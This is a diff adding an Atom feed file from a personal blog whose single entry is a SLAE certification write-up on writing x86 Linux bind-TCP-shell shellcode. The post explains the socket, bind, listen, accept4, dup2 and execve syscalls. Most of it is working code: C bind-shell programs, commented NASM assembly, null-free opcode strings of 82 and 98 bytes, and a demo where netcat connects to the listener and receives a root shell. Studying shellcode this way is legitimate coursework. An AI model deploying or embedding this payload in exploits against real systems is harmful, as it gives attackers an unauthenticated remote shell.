@@ -1,0 +1,654 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Slae | tcunha.github.io]]></title>
+  <link href="http://tcunha.github.io/blog/categories/slae/atom.xml" rel="self"/>
+  <link href="http://tcunha.github.io/"/>
+  <updated>2018-05-24T23:17:39+00:00</updated>
+  <id>http://tcunha.github.io/</id>
+  <author>
+    <name><![CDATA[tcunha]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[SLAE 0x01: Bind TCP Shell]]></title>
+    <link href="http://tcunha.github.io/blog/2018/05/20/slae-0x01-bind-tcp-shell/"/>
+    <updated>2018-05-20T21:51:39+00:00</updated>
+    <id>http://tcunha.github.io/blog/2018/05/20/slae-0x01-bind-tcp-shell</id>
+    <content type="html"><![CDATA[<p>In contrast with the shellcodes in shell-storm.org and exploit-db.com, this one is using the well known socket functions. According to <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a> these are also available as system calls since Linux version 4.3.</p>
+
+<p>I&rsquo;ve also decided not to call <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> to reuse the port and relied on some implementation-specific behaviour to keep the shellcode smaller.</p>
+
+<p>To perform a network I/O operation a process needs to first call <a href="http://man7.org/linux/man-pages/man2/socket.2.html">socket(2)</a> by specifying the desired protocol and to obtain a file descriptor:</p>
+
+<pre><code class="c socket(2) prototype">int socket(int domain, int type, int protocol);
+</code></pre>
+
+<p>The domain (also known as family) is implementation-defined, but most of the time it is one of:</p>
+
+<pre><code>+----------+-------------+
+|  domain  | description |
++----------+-------------+
+| AF_INET  | IPv4        |
+| AF_INET6 | IPv6        |
+| AF_LOCAL | Unix domain |
++----------+-------------+
+</code></pre>
+
+<p>The type specifies the semantics of the communication:</p>
+
+<pre><code>+-------------+-----------------+
+|    type     |   description   |
++-------------+-----------------+
+| SOCK_STREAM | Stream socket   |
+| SOCK_DGRAM  | Datagram socket |
++-------------+-----------------+
+</code></pre>
+
+<p>The protocol can be set to zero to select the default one for the combination of domain and type:</p>
+
+<pre><code>+--------------+-----------------+
+|   protocol   |   description   |
++--------------+-----------------+
+| IPPROTO_TCP  | TCP transport   |
+| IPPROTO_UDP  | UDP transport   |
+| IPPROTO_SCTP | SCTP transport  |
++--------------+-----------------+
+</code></pre>
+
+<pre><code class="bash retrieving the system call number and constants">$ asm-syscall socket
+#define __NR_socket 359
+0x167
+$ python -c 'import socket; print socket.AF_INET; print socket.SOCK_STREAM'
+2
+1
+</code></pre>
+
+<p>With this in mind the registers will contain the following before and after the system call:</p>
+
+<pre><code>+----------+-------+
+| register | value |
++----------+-------+
+| eax      | 359   |
+| ebx      | 2     |
+| ecx      | 1     |
+| edx      | 0     |
++----------+-------+
+| return   | fd    |
++----------+-------+
+</code></pre>
+
+<p>The bind shell will use the AF_INET family with a SOCK_STREAM type. Beware that not all combinations of family and type are valid. Then, one needs to use <a href="http://man7.org/linux/man-pages/man2/bind.2.html">bind(2)</a> to assign a local protocol address to the socket:</p>
+
+<pre><code class="c bind(2) prototype">int bind(int sockfd, const struct sockaddr *addr, socklen_t addr_len);
+</code></pre>
+
+<p>The socket address structure, in this case, has to be manually packed and will be IPv4 specific. Nowadays, one should use <a href="http://man7.org/linux/man-pages/man3/getaddrinfo.3.html">getaddrinfo(3)</a> and sockaddr_storage which is large enough for any socket structure, instead:</p>
+
+<pre><code class="c">#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+
+#include &lt;err.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+int
+bind_try(struct addrinfo *p)
+{
+    int fd, yes = 1;
+
+    if ((fd = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol)) == -1) {
+        warn("socket");
+        return (-1);
+    }
+    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof yes) == -1)
+        err(1, "setsockopt");
+    if (bind(fd, p-&gt;ai_addr, p-&gt;ai_addrlen) == -1) {
+        close(fd);
+        warn("bind");
+        return (-1);
+    }
+
+    return (fd);
+}
+
+int
+main(int argc, char **argv)
+{
+    char                    *exec_argv[] = { "/bin/sh", NULL };
+    int                      ai_ret, fd, fd_client;
+    socklen_t                sl_client;
+    struct addrinfo          ai_hints;
+    struct addrinfo         *ai_ptr, *ai_srv;
+    struct sockaddr_storage  sa_client;
+
+    if (argc != 2)
+        errx(1, "usage: port");
+
+    memset(&amp;ai_hints, 0, sizeof ai_hints);
+    ai_hints.ai_family = AF_UNSPEC;
+    ai_hints.ai_socktype = SOCK_STREAM;
+    ai_hints.ai_flags = AI_PASSIVE;
+
+    if ((ai_ret = getaddrinfo(NULL, argv[1], &amp;ai_hints, &amp;ai_srv)) != 0)
+        errx(1, "getaddrinfo: %s", gai_strerror(ai_ret));
+    for (ai_ptr = ai_srv; ai_ptr != NULL; ai_ptr = ai_ptr-&gt;ai_next) {
+        if ((fd = bind_try(ai_ptr)) != -1)
+            break;
+    }
+    if (ai_ptr == NULL)
+        errx(1, "failed to bind");
+    freeaddrinfo(ai_srv);
+    sl_client = sizeof sa_client; 
+
+    if (listen(fd, 5) == 1)
+        err(1, "listen");
+    fd_client = accept(fd, (struct sockaddr *) &amp;sa_client, &amp;sl_client);
+    if (fd_client == -1)
+        err(1, "accept");
+
+    if (dup2(fd_client, STDIN_FILENO) == -1)
+        err(1, "dup2");
+    if (dup2(fd_client, STDOUT_FILENO) == -1)
+        err(1, "dup2");
+    if (dup2(fd_client, STDERR_FILENO) == -1)
+        err(1, "dup2");
+
+    execve(exec_argv[0], exec_argv, NULL);
+    err(1, "execve");
+
+    return (0); /* NOTREACHED */
+}
+</code></pre>
+
+<p>Per the UNP book, it isn&rsquo;t mandatory to choose a port nor an address to bind to. In that case, the kernel picks an ephemeral port and uses the destination IP address of the client&rsquo;s SYN as the server&rsquo;s source IP address.</p>
+
+<pre><code class="c IPv4 socket structure">struct in_addr {
+    in_addr_t s_addr;        /* 32-bit IPv4 address */
+}; /* used to be a union on 4.2BSD */
+
+struct sockaddr_in {
+    sa_family_t sin_family;  /* 16-bit family (AF_INET) */
+    in_port_t sin_port;      /* 16-bit port number */
+    struct in_addr sin_addr; /* 32-bit address */
+    char sin_zero[8];        /* unused */
+};
+</code></pre>
+
+<pre><code class="c generic socket structure">struct sockaddr {
+    unsigned short sa_family; /* address family, AF_xxx */
+    char sa_data[14];         /* 14 bytes of protocol address */
+}; 
+</code></pre>
+
+<p>According to <a href="http://www.kohala.com/start/">Stevens</a>, the sin_zero member was added so that all socket address structures are at least 16 bytes in size and isn&rsquo;t really required when it is going to be used with the wildcard address.</p>
+
+<p>The socket structures are casted to the generic socket address structure, due to the functions having to deal with a multitude of protocol families (IPv4, IPv6, Unix and datalink, for instance). One could have used void from ANSI C instead of the generic structure, however that was non-existent back in 1982.</p>
+
+<pre><code class="c IPv6 socket structure">struct in6_addr {
+    uint8_t s6_addr[16];       /* 128-bit IPv6 address */
+};
+
+struct sockaddr_in6 {
+    sa_family_t sin6_family;   /* 16-bit family (AF_INET6) */
+    in_port_t sin6_port;       /* 16-bit port number */
+    uint32_t sin6_flowinfo;    /* 32-bit flow information */
+    struct in6_addr sin6_addr; /* 128-bit address */
+    uint32_t sin6_scope_id;    /* 32-bit scope ID */
+};
+</code></pre>
+
+<p>The important part here is that the family struct members match, so that it can be freely accessed when casted to the generic socket structure.</p>
+
+<pre><code class="bash retrieving the system call number and constants">$ asm-syscall bind
+#define __NR_bind 361
+0x169
+$ python -c 'import socket; print socket.INADDR_ANY'
+0
+</code></pre>
+
+<pre><code>+----------+--------------------+
+| register |       value        |
++----------+--------------------+
+| eax      | 361                |      +---------------------------+ H
+| ebx      | socket(2) fd       |      | INADDR_ANY (0)            |
+| ecx      | esp pointer        +--&gt;&gt;--+ port (network byte order) |
+| edx      | 16                 |      | AF_INET (2)               |
++----------+--------------------+      +---------------------------+ L
+</code></pre>
+
+<p>This is the point where <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> could be used to prevent the address is already in use error, which might occur if there are still previously established connections lying around.</p>
+
+<p>For the <a href="http://man7.org/linux/man-pages/man2/listen.2.html">listen(2)</a> system call, according to <a href="http://pubs.opengroup.org/onlinepubs/9699919799/">SUSv4</a> a backlog argument of 0 may allow the socket to accept connections, in which case the length of the listen queue may be set to an implementation-defined minimum value. This works if SYN cookies are <a href="https://access.redhat.com/solutions/30453">enabled</a>, which is usually the case with recent versions.</p>
+
+<pre><code class="c listen(2) prototype">int listen(int sockfd, int backlog);
+</code></pre>
+
+<pre><code class="bash retrieving the system call number">$ asm-syscall listen
+#define __NR_listen 363
+0x16b
+</code></pre>
+
+<pre><code>+----------+---------------+
+| register |     value     |
++----------+---------------+
+| eax      | 363           |
+| ebx      | socket(2) fd  |
+| ecx      | 0             |
++----------+---------------+
+</code></pre>
+
+<p>Next and finally in the flow is the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">accept4(2)</a> call which is used to return a completed connection from the queue, if any. On success the return value is a new file descriptor created by the kernel to be used with the recently established connection:</p>
+
+<pre><code class="c accept4(2) prototype">int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
+</code></pre>
+
+<p>The second and third arguments are used by the kernel to fill the address structure of the newly connected peer. According to the manual page these aren&rsquo;t really needed and can be both NULL.</p>
+
+<pre><code>+----------+---------------+
+| register |     value     |
++----------+---------------+
+| eax      | 364           |
+| ebx      | socket(2) fd  |
+| ecx      | 0             |
+| edx      | 0             |
+| esi      | 0             |
++----------+---------------+
+| return   | new fd        |
++----------+---------------+
+</code></pre>
+
+<p>For the <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> system call there&rsquo;s no need to specify argv and envp, since according to the manual page on Linux, argv and envp can be specified as NULL. This is obviously <a href="http://pubs.opengroup.org/onlinepubs/9699919799/">non-standard</a> and might result in an error on other systems.</p>
+
+<pre><code class="c execve(2) prototype">int execve(const char *filename, char *const argv[], char *const envp[]);
+</code></pre>
+
+<pre><code class="bash retrieving the system call number">$ asm-syscall execve
+#define __NR_execve 11
+0xb
+</code></pre>
+
+<pre><code>+----------+-------------+
+| register |    value    |
++----------+-------------+
+| eax      | 11          |      +-----------+
+| ebx      | esp pointer +--&gt;&gt;--+ /bin/sh\0 |
+| ecx      | 0           |      +-----------+
+| edx      | 0           |
++----------+-------------+
+</code></pre>
+
+<pre><code class="bash converting path to hex and little endian">$ asm-string /bin/sh
+Adding 1 slashes!
+Original string: /bin/sh (7)
+Modified string: //bin/sh (8)
+0x68732f6e
+0x69622f2f
+</code></pre>
+
+<pre><code class="asm initial execve(2) shellcode">; Regular execve(2) /bin/sh shellcode that tries to save as much space possible
+; and follow the specification.
+
+global _start
+
+section .text
+_start:
+    xor eax, eax
+
+    push eax
+    mov edx, esp    ; envp
+    push 0x68732f6e ; n/sh
+    push 0x69622f2f ; //bi
+    mov ebx, esp    ; filename
+
+    push eax
+    push ebx
+    mov ecx, esp    ; argv
+
+    mov al, 0xb
+    int 0x80
+</code></pre>
+
+<pre><code class="bash">$ asm-opcodes execve
+Shellcode size: 25
+\x31\xc0\x50\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+$ strace ./execve    
+execve("./execve", ["./execve"], [/* 19 vars */]) = 0    
+execve("//bin/sh", ["//bin/sh"], [/* 0 vars */]) = 0
+</code></pre>
+
+<p>Not specifying those arguments allows saving 4 bytes:</p>
+
+<pre><code class="asm second version of execve(2) shellcode">; Save space by making the second argument to execve(2) empty. This doesn't
+; strictly follow POSIX or SUS.
+
+global _start
+
+section .text
+_start:
+    xor ecx, ecx    ; argv
+    mul ecx         ; makes eax and edx (envp) zero
+
+    push eax
+    push 0x68732f6e ; n/sh
+    push 0x69622f2f ; //bi
+    mov ebx, esp    ; filename
+
+    mov al, 0xb
+    int 0x80
+</code></pre>
+
+<pre><code class="bash">$ asm-opcodes execve
+Shellcode size: 21
+\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80
+$ strace ./execve
+execve("./execve", ["./execve"], [/* 19 vars */]) = 0
+execve("//bin/sh", NULL, NULL)
+</code></pre>
+
+<p>The standard input, output and error file descriptors need to be redirected with <a href="http://man7.org/linux/man-pages/man2/dup.2.html">dup2(2)</a> beforehand to the recently <a href="http://man7.org/linux/man-pages/man2/accept.2.html">accept4(2)</a> file descriptor in order to have interaction with the created shell.</p>
+
+<pre><code class="c dup2(2) prototype">int dup2(int fildes, int fildes2);
+</code></pre>
+
+<pre><code class="bash retrieving the system call number">$ asm-syscall dup2
+#define __NR_dup2 63
+0x3f
+</code></pre>
+
+<pre><code>+----------+---------------+
+| register |     value     |
++----------+---------------+
+| eax      | 63            |
+| ebx      | accept4(2) fd |
+| ecx      | 2, 1, 0       |
++----------+---------------+
+| return   | 2, 1, 0       |
++----------+---------------+
+</code></pre>
+
+<p>In C, overall, this roughly translates to:</p>
+
+<pre><code class="c">#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+
+#include &lt;arpa/inet.h&gt;
+
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;limits.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;strings.h&gt;
+#include &lt;unistd.h&gt;
+
+int
+main(int argc, char **argv)
+{
+    char                    *exec_argv[] = { "/bin/sh", NULL };
+    char                    *endptr;
+    int                      fd, fd_client, yes = 1;
+    long                     port;
+    socklen_t                sl_client;
+    struct sockaddr_in       sa;
+    struct sockaddr_storage  sa_client;
+
+    if (argc == 1)
+        errx(1, "usage: port");
+
+    errno = 0;
+    port = strtol(argv[1], &amp;endptr, 10);
+    if (*endptr != '\0')
+        errx(1, "not a number");
+    if (errno == ERANGE || (port &lt;= 1024 || port &gt;= 65536))
+        errx(1, "port out of range");
+
+    if ((fd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
+        err(1, "socket");
+
+    bzero(&amp;sa, sizeof sa);
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = htonl(INADDR_ANY);
+    sa.sin_port = htons(port);
+
+    if (bind(fd, (struct sockaddr *) &amp;sa, sizeof sa) == -1)
+        err(1, "bind");
+    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof yes) == -1)
+        err(1, "setsockopt");
+    if (listen(fd, 5) == -1)
+        err(1, "listen");
+
+    sl_client = sizeof sa_client; 
+    fd_client = accept(fd, (struct sockaddr *) &amp;sa_client, &amp;sl_client);
+    if (fd_client == -1)
+        err(1, "accept");
+
+    if (dup2(fd_client, STDIN_FILENO) == -1)
+        err(1, "dup2");
+    if (dup2(fd_client, STDOUT_FILENO) == -1)
+        err(1, "dup2");
+    if (dup2(fd_client, STDERR_FILENO) == -1)
+        err(1, "dup2");
+
+    execve(exec_argv[0], exec_argv, NULL);
+    err(1, "execve");
+
+    return (0); /* NOTREACHED */
+}
+</code></pre>
+
+<p>And, finally, the commented shellcode:</p>
+
+<pre><code class="asm">global _start
+
+section .text
+_start:
+    xor eax, eax
+    xor esi, esi            ; will always hold the value 0
+    cdq                     ; set edx to zero as well, by sign extending eax
+
+    mov ax, 0x167           ; use mov instead of push imm16 and pop r16
+    ; int socket(int, int, int)
+    push 0x2                ; PF_INET
+    pop ebx                 ; domain
+    push 0x1                ; SOCK_STREAM
+    pop ecx                 ; type
+    ; edx (protocol) initialized to zero by the cdq instruction above
+    int 0x80
+
+    xchg ebx, eax           ; fd on ebx from this point below
+    mov ax, 0x169           ; use mov instead of push imm16 and pop r16
+    ; int bind(int, const struct sockaddr *, socklen_t)
+    push esi                ; INADDR_ANY
+    push word PORT          ; port in network byte order
+    push word 0x2           ; AF_INET
+    mov ecx, esp            ; addr
+    push 0x10               ; 16 bytes in total
+    pop edx                 ; addrlen
+    int 0x80
+
+    mov ax, 0x16b           ; use mov instead of push imm16 and pop r16
+    ; int listen(int, int)
+    xor ecx, ecx            ; backlog
+    int 0x80
+
+    mul ecx                 ; set edx (addrlen) to zero
+    mov ax, 0x16c           ; use mov instead of push imm16 and pop r16
+    ; int accept4(int, struct sockaddr *, socklen_t *, int)
+    ; ecx (addr) is already zero from the above listen(2)
+    ; edx (addrlen) is already zero
+    ; esi (flags) is already zero
+    int 0x80
+
+    xchg ebx, eax           ; fd
+    inc ecx                 ; zero from the above listen(2)
+    inc ecx                 ; newfd
+bind_dup2_loop:
+    push 0x3f
+    ; int dup2(int, int)
+    pop eax 
+    int 0x80
+    dec ecx
+    jns bind_dup2_loop      ; don't jump if ecx is positive
+
+    push eax                ; eax is zero from the dup2(2) above (stdin fd)
+    mov al, 0xb
+    ; int execve(const char *, char *const [], char *const [])
+    push 0x68732f6e         ; n/sh
+    push 0x69622f2f         ; //bi
+    mov ebx, esp            ; filename
+    inc ecx                 ; ecx (argv) is 0xffffffff from the above dup(2)
+    ; edx is already zero from the above accept4(2)
+    int 0x80
+</code></pre>
+
+<p>Running the shellcode is only a matter of configuring the desired listening port with the optional -l command-line argument (4242/tcp by default) and running make. This process also ensures that it is \x00 free and automatically compiles the usual C file that executes the shellcode:</p>
+
+<pre><code class="bash">$ ./configure -l 1337
+Using remote host: 0x0101017f
+Using listening port: 0x3905
+Using remote port: 0x9210
+$ ./configure -l 1280
+Port contains NUL bytes!
+$ ./configure
+Using remote host: 0x0101017f
+Using listening port: 0x9210
+Using remote port: 0x9210
+$ cd 0x01-bind/
+$ make
+nasm  -f elf32 -o bind.o bind.asm
+ld  -o bind bind.o
+08048060 &lt;_start&gt;:
+ 8048060:       31 c0                   xor    eax,eax
+ 8048062:       31 f6                   xor    esi,esi
+ 8048064:       99                      cdq
+ 8048065:       66 b8 67 01             mov    ax,0x167
+ 8048069:       6a 02                   push   0x2
+ 804806b:       5b                      pop    ebx
+ 804806c:       6a 01                   push   0x1
+ 804806e:       59                      pop    ecx
+ 804806f:       cd 80                   int    0x80
+ 8048071:       93                      xchg   ebx,eax
+ 8048072:       66 b8 69 01             mov    ax,0x169
+ 8048076:       56                      push   esi
+ 8048077:       66 68 10 92             pushw  0x9210
+ 804807b:       66 6a 02                pushw  0x2
+ 804807e:       89 e1                   mov    ecx,esp
+ 8048080:       6a 10                   push   0x10
+ 8048082:       5a                      pop    edx
+ 8048083:       cd 80                   int    0x80
+ 8048085:       66 b8 6b 01             mov    ax,0x16b
+ 8048089:       31 c9                   xor    ecx,ecx
+ 804808b:       cd 80                   int    0x80
+ 804808d:       f7 e1                   mul    ecx
+ 804808f:       66 b8 6c 01             mov    ax,0x16c
+ 8048093:       cd 80                   int    0x80
+ 8048095:       93                      xchg   ebx,eax
+ 8048096:       41                      inc    ecx
+ 8048097:       41                      inc    ecx
+
+08048098 &lt;bind_dup2_loop&gt;:
+ 8048098:       6a 3f                   push   0x3f
+ 804809a:       58                      pop    eax
+ 804809b:       cd 80                   int    0x80
+ 804809d:       49                      dec    ecx
+ 804809e:       79 f8                   jns    8048098 &lt;bind_dup2_loop&gt;
+ 80480a0:       50                      push   eax
+ 80480a1:       b0 0b                   mov    al,0xb
+ 80480a3:       68 6e 2f 73 68          push   0x68732f6e
+ 80480a8:       68 2f 2f 62 69          push   0x69622f2f
+ 80480ad:       89 e3                   mov    ebx,esp
+ 80480af:       41                      inc    ecx
+ 80480b0:       cd 80                   int    0x80
+Shellcode size: 82
+\x31\xc0\x31\xf6\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x93\x66\xb8\x69\x01\x56\x66\x68\x10\x92\x66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\xf7\xe1\x66\xb8\x6c\x01\xcd\x80\x93\x41\x41\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x50\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
+</code></pre>
+
+<pre><code class="bash"># ./shellcode
+Shellcode length: 82
+$ ss -nlt|grep 4242
+LISTEN     0      0            *:4242                     *:*
+$ nc -v 127.0.0.1 4242
+Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>To confirm with <a href="http://man7.org/linux/man-pages/man1/strace.1.html">strace(1)</a>:</p>
+
+<pre><code class="bash"># make strace
+$ head -n35 bind.strace
+execve("./shellcode", ["./shellcode"], [/* 23 vars */]) = 0
+write(1, "Shellcode length: 82\n", 21)  = 21
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+bind(3, {sa_family=AF_INET, sin_port=htons(4242), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+listen(3, 0)                            = 0
+accept4(3, NULL, NULL, 0)               = 4
+dup2(4, 2)                              = 2
+dup2(4, 1)                              = 1
+dup2(4, 0)                              = 0
+execve("//bin/sh", NULL, NULL)          = 0
+</code></pre>
+
+<p>Having the <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> call would result in an increase of <strong>16 bytes</strong>:</p>
+
+<pre><code class="diff">--- ../../0x01-bind/bind.asm.in 2018-05-21 00:35:48.689635600 +0100
++++ setsockopt.asm      2018-05-21 00:41:40.340303200 +0100
+@@ -1,9 +1,12 @@
++; Like the bind shell but with a call to setsockopt(2). Allows a server to bind
++; to a port even if there are previously established connections. Also useful
++; when there are multiple local aliased IP addresses listening on the same port.
++
+ global _start
+
+ section .text
+ _start:
+        xor eax, eax
+-       xor esi, esi            ; will always hold the value 0
+        cdq                     ; set edx to zero as well, by sign extending eax
+
+        mov ax, 0x167           ; use mov instead of push imm16 and pop r16
+@@ -15,7 +18,18 @@
+        ; edx (protocol) initialized to zero by the cdq instruction above
+        int 0x80
+
++       xchg edx, ebx           ; SO_REUSEADDR
+        xchg ebx, eax           ; fd on ebx from this point below
++       mov ax, 0x16e           ; use mov instead of push imm16 and pop r16
++       ; int setsockopt(int, int, int, const void *, socklen_t)
++       ; ecx (level) is already 1 from the above socket(2) call
++       push 0x1                ; enabled
++       mov esi, esp            ; optval
++       push 0x4                ; 4 bytes
++       pop edi                 ; optlen
++       int 0x80
++
++       xor esi, esi            ; will always hold the value 0
+        mov ax, 0x169           ; use mov instead of push imm16 and pop r16
+        ; int bind(int, const struct sockaddr *, socklen_t)
+        push esi                ; INADDR_ANY
+</code></pre>
+
+<pre><code class="bash">$ asm-compile setsockopt.asm
+$ asm-opcodes setsockopt
+Shellcode size: 98                      
+\x31\xc0\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x87\xd3\x93\x66\xb8\x6e\x01\x6a\x01\x89\xe6\x6a\x04\x5f\xcd\x80\x31\xf6\x66\xb8\x69\x01\x56\x66\x68\x10\x92\x
+66\x6a\x02\x89\xe1\x6a\x10\x5a\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\xf7\xe1\x66\xb8\x6c\x01\xcd\x80\x93\x41\x41\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x56\x68\x6e
+\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x41\xcd\x80
+</code></pre>
+
+<p>This blog post has been created for completing the requirements of the
+SecurityTube Linux Assembly Expert certification:</p>
+
+<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></p>
+
+<p>Student-ID: SLAE-1154</p>
+]]></content>
+  </entry>
+  
+</feed>
